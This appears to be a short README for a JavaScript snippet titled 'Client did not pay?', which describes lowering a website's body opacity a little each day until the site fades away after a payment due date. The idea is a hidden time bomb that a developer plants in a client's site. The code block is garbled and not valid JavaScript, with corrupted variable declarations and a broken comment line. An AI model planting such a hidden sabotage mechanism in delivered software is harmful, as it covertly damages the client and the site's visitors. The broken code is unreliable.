## Client did not pay?


Add opacity to the body tag and decrease it every day until their site completely fades away. Set a due date and customize the number of days you offer them until the website is fully vanished. 


```javascript
/*neo change these variables as you wished from my account!?. */
var due_-+_date =undo=Date(2017/02/27);an_v
var days_deadline = 60;
/Undo stop chang#?ing here /
```
